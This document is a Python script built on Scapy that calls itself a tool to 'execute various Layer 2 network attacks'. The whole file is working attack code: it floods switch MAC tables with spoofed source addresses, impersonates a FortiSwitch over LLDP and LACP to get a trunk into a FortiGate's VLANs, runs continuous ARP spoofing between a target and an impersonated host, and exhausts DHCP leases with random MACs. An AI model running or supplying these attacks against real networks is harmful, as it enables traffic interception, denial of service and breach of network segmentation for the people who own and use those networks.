#!/usr/bin/python3

# Requirements: Scapy for Python3 - apt-get install python3-scapy
# 		tcpreplay - apt-get install tcpreplay

import argparse
import os
import threading
import time
import random
from scapy.all import *
from scapy.contrib.lldp import *
from scapy.contrib.lacp import *

# create parser
main_parser = argparse.ArgumentParser(description='Execute various Layer 2 network attacks.')

subparsers = main_parser.add_subparsers(dest='action')

flood_parser = subparsers.add_parser('flood',help='Flood packages')

vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')

arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')

dhcpstarvation_parser = subparsers.add_parser('dhcpstarvation',help='DHCP Starvation attack')


main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")

flood_parser.add_argument("-t","--floodtype",help="Flood type", choices =["unknown_unicast","unknown_multicast","unknown_broadcast"], required=True)
flood_parser.add_argument("-c","--packetcount",help="Amount of packets", default=65000,type=int)
flood_parser.add_argument("-d","--destinationip",help="Destination IP Address",default="0.0.0.0")
flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Address",default="00:01:02:03:04:05")

arpspoof_parser.add_argument("-t","--target",help="IP address of the target device whose traffic you wish to intercept.",required=True)
arpspoof_parser.add_argument("-i","--impersonate",help="IP address of the device you want to impersonate to the target.",required=True)
arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, default=0.5s",default=0.5)

dhcpstarvation_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
dhcpstarvation_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")


#vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
#vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")
vlanhop_parser.add_argument("-hn","--hostname",help="Hostname of fake FortiSwitch",default="SWITCH32")
#vlanhop_parser.add_argument("-tn","--trunkname",help="Trunkname for FortiSwitch",default="")
vlanhop_parser.add_argument("-sn","--serialnumber",help="Serialnumber of fake FortiSwitch",default="S108DVWSM12345")


main_args = main_parser.parse_args()
action = main_args.action

if main_args.interface:
   conf.iface=main_args.interface

isl_link_flags = {
   "auto-isl":0,
   "auto-mclag-icl":1,
   "mclag-switch":2,
   "?":3,
   "isl-fortilink":4,
}


event_LACP_Established = threading.Event()


src_mac = ""

# level 0 = standard output, level 1 = info, level 2 = debug
def dprint(*args,level=0):
   if level <= main_args.verbose:
      print(' '.join(map(str, args)))

def unicast_randMAC():
   mac = RandMAC()
   mac_list = mac.split(":")
   first_byte = int(mac_list[0], 16) & 0xFE  # Clear the least significant bit
   mac_list[0] = "{:02x}".format(first_byte)
   return ":".join(mac_list)

def mac_to_bin(mac_address):
    return bytes(int(b, 16) for b in mac_address.split(':'))


def handle_dhcp_packet(packet):
    if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
        offered_ip = packet[BOOTP].yiaddr
        transcation_id = packet[BOOTP].xid
        send_dhcp_request(offered_ip,transcation_id)

def send_dhcp_discover():
    dhcp_discover = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=random.randint(0, 0xFFFFFFFF)) /
        DHCP(options=[("message-type", "discover"), "end"])
    )
    sendp(dhcp_discover)

def send_dhcp_request(offered_ip,transaction_id):
    dhcp_request = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=transaction_id) /
        DHCP(options=[("message-type", "request"), 
                      ("requested_addr", offered_ip),
                      "end"])
    )
    sendp(dhcp_request)


def dhcpstarvation():
    global src_mac

    print("Launching DHCP Server attack")
    for i in range(main_args.count):

       src_mac = unicast_randMAC()
       send_dhcp_discover()
       sniff(prn=handle_dhcp_packet, filter="udp and port 68", count=1, timeout=1)


def dhcpstarvation_old(): 

   if not (main_args.dhcpserver):
      print("Define IP")
      return

   for i in range(main_args.count):
      fakeMAC=RandMAC()
      dhcp_request = (Ether(src=fakeMAC,dst="FF:FF:FF:FF:FF:FF")
                     /IP(src="0.0.0.0",dst="255.255.255.255")
                     /UDP(sport=68, dport=67)
                     /BOOTP(chaddr=fakeMAC,xid=0x123456)
                     /DHCP(options=[("message-type","request"),("client_id", b"\x01\x00\x11\x22\x33\x44\x55"),"end"]))
      sendp(dhcp_request)

   dhcp_discover = (
   Ether(src="00:11:22:33:44:55", dst="ff:ff:ff:ff:ff:ff") /
   IP(src="0.0.0.0", dst="255.255.255.255") /
   UDP(sport=68, dport=67) /
   BOOTP(op=1, chaddr=b"\x00\x11\x22\x33\x44\x55" + b"\x00" * 10, xid=0x1000) /
   DHCP(options=[("message-type", "discover"), "end"])
   )

   # Send the DHCP discover packet
   

def fortilink_isl(lldp_keep_alive):
    print("Establishing FortiLink ISL...",end="",flush=True)

    sendp(lldp_keep_alive,verbose=0)

    packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
    if not packet:
       print("Failed")
       print("Error: No LACP Packet received")
       return

    lacp_response=packet[0]
    del lacp_response.src
    lacp_response[LACP].actor_system = get_if_hwaddr(conf.iface)
    lacp_response[LACP].actor_system_priority = lacp_response[LACP].actor_system_priority - 1
    sendp(lacp_response,verbose=0)

    packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
    
    # Set Partner Settings
    lacp_response[LACP].partner_system_priority = packet[0][LACP].actor_system_priority
    lacp_response[LACP].partner_system = packet[0][LACP].actor_system
    lacp_response[LACP].partner_key = packet[0][LACP].actor_key
    lacp_response[LACP].partner_port_priority = packet[0][LACP].actor_port_priority
    lacp_response[LACP].partner_port_number = packet[0][LACP].actor_port_number

    while True:
       packet = sniff(filter="ether proto 0x8809", count=1, timeout=5)
       if packet:
          if (not event_LACP_Established.is_set() and packet[0][LACP].partner_state & 0b00110000):
             print("LACP Trunk established")
             event_LACP_Established.set()

       # Mirror state of opposite LACP Trunk
          lacp_response[LACP].actor_state = packet[0][LACP].actor_state
          lacp_response[LACP].partner_state = packet[0][LACP].actor_state
       sendp(lacp_response,verbose=0)
       sendp(lldp_keep_alive,verbose=0)
       time.sleep(1)

def arpspoof():
   print("Launching arpspoof attack")
   print("Retrieve MAC for target (",main_args.target,"): ",sep="",end="",flush=True)
   arp_request= ARP(pdst=main_args.target)
   answer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=main_args.target),timeout=5,verbose=False)
   if len(answer[0]) > 0:
      print (answer[0][0][1].hwsrc)
      targetMAC = answer[0][0][1].hwsrc
   else:
     print("No response")
     return

   print("Retrieve MAC for impersonated host (",main_args.impersonate,"): ",sep="",end="",flush=True)
   arp_request= ARP(pdst=main_args.impersonate)
   answer = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=main_args.impersonate),timeout=5,verbose=False)
   if len(answer[0]) > 0:
      print (answer[0][0][1].hwsrc)
      impersonateMAC = answer[0][0][1].hwsrc
   else:
     print("No response")
     return

   print("ARP Attack running.")
   while True:
      #packet to target
      sendp(Ether(dst=targetMAC)/ARP(op="is-at",psrc=main_args.impersonate,pdst=main_args.target,hwdst=targetMAC),count=1,verbose=False)
      #packet to impersonated host
      sendp(Ether(dst=impersonateMAC)/ARP(op="is-at",psrc=main_args.target,pdst=main_args.impersonate,hwdst=impersonateMAC),count=1,verbose=False)      
      time.sleep(main_args.frequency)


def vlanhop(iface=main_args.interface):
    print("Launching vlanhop attack")
    print("Listening for LLDP packets...",end="",flush=True)

    # Listen to LLDP packets
    packet=sniff(filter="ether proto 0x88cc",count=1,timeout=60)

    if (not packet):
       print("timeout")
       dprint("FAIL: No LLDP packet received")
       return

    dprint("received")
    dprint("System name:",packet[0][LLDPDUSystemName].system_name.decode("UTF-8"))
    dprint("System description:",packet[0][LLDPDUSystemDescription].description.decode("UTF-8"))
    dprint("Switchport interface:",packet[0][LLDPDUPortDescription].description.decode("UTF-8"))
    dprint("Switch management address:",inet_ntop(socket.AF_INET,(packet[0][LLDPDUManagementAddress].management_address)))

    if not (b"FortiSwitch" in packet[0][LLDPDUSystemDescription].description):
       print("FAIL: Not a FortiSwitch LLDP Packet")
       return

    lldp_response = packet[0]
    lldp_response[LLDPDUChassisID].id = get_if_hwaddr(conf.iface)
    del lldp_response.src
    del lldp_response[LLDPDUSystemName]._length
    lldp_response[LLDPDUSystemName].system_name = main_args.hostname

    i = 1
    print("Listening for Fortigate LLDP TLVs...",end="",flush=True)
    remoteAutoISL = False
    while packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i):
       org_layer = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i)
       dprint("Found org code:",org_layer.org_code,level=2)

       if (org_layer.org_code==547598):
          dprint("Forticode found:",org_layer.subtype,level=2)
          #type 1 hostname
          if org_layer.subtype==1:
             dprint("FortiLink Hostname TLV ID 1",level=1)
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = main_args.hostname
             del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length

          #type 2 serial
          elif org_layer.subtype==2:
             dprint("FortiLink Serialnumber TLV ID 2",level=1)
             print("Found")
             print("Switch Serialnumber:",org_layer.data.decode("UTF-8"))
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = main_args.serialnumber
             del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length

          #type 3 port_options
          elif org_layer.subtype==3:
             dprint("FortiLink link properties TLV ID 3",level=1)
             dprint("Link properties:",org_layer.data[3],level=1)
             remoteAutoISL = True
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = b"\x00\x00\x02\x5b\x00\x107C08aPXFm8QrATSP"

       i += 1

    if not remoteAutoISL:
       print("Non Found")
       print("FAIL: Switch Auto-ISL is disabled")
       return

    lacp_thread = threading.Thread(target=fortilink_isl,args=(lldp_response,))
    lacp_thread.daemon = True
    lacp_thread.start()

    event_LACP_Established.wait(timeout=65)

    if not event_LACP_Established.is_set():
       print("FAIL: LACP trunk could not be established")

    fortilink_packet=sniff(filter="ether proto 0x88ff",count=1,store=1,timeout=20)

    print("")
    print("To access the VLANs from your host run:  sudo ip link add link ",conf.iface," name ",conf.iface,".<vlan-id> type vlan id <vlan-id>",sep="")
    print("Keep this program running in the background")
    print("")
    print("Detected VLANs (passivly):")

    detected_vlans = []

    while True:
       time.sleep(1)
       vlan_packet=sniff(count=10,timeout=5)
       for single_packet in vlan_packet:
          if (single_packet.haslayer(Dot1Q)):
             if not single_packet[Dot1Q].vlan in detected_vlans:
                 detected_vlans.append(single_packet[Dot1Q].vlan)
                 print(single_packet[Dot1Q].vlan)


def l2_flood(floodtype,iface=main_args.interface):
    print("Launching flood attack:",floodtype)
    ttl=10
    if floodtype == "unknown_multicast":
       print("Generating",main_args.packetcount,"multicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       if main_args.destinationip=="0.0.0.0":
          dstip = "224.0.0.0"
       dst_mac = "11:22:33:44:55:66"
       ttl=1

    if floodtype == "unknown_unicast":
       print("Generating",main_args.packetcount,"unicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "10:22:33:44:55:66"

    if floodtype == "unknown_broadcast":
       print("Generating",main_args.packetcount,"broadcast flood packets")
       base_mac_int = int.from_bytes(b'\x0c\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationip=="0.0.0.0":
          dstip = "255.255.255.255"
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "FF:FF:FF:FF:FF:FF"



    # generate packets in memory
    packet_list = []

    for i in range(1, main_args.packetcount):
        src_mac = ':'.join('%02x' % byte for byte in (base_mac_int + i).to_bytes(6, 'big')) # Iterate over source mac address, add one each loop
        frame = Ether(src=src_mac, dst=dst_mac) / IP(dst=dstip, src=RandIP(), ttl=ttl) / ICMP()
        packet_list.append(frame)

    print("Sending packets...",end="")
    sendpfast(packet_list, iface=iface)
    print("Done")




# Program start

if os.geteuid() != 0:
  print("--- Script not started as root user, possible permissions problem ---")

if action=="flood":
   l2_flood(floodtype=main_args.floodtype)

if action=="vlanhop":
   vlanhop()

if action=="arpspoof":
   arpspoof()

if action=="dhcpstarvation":
   dhcpstarvation()
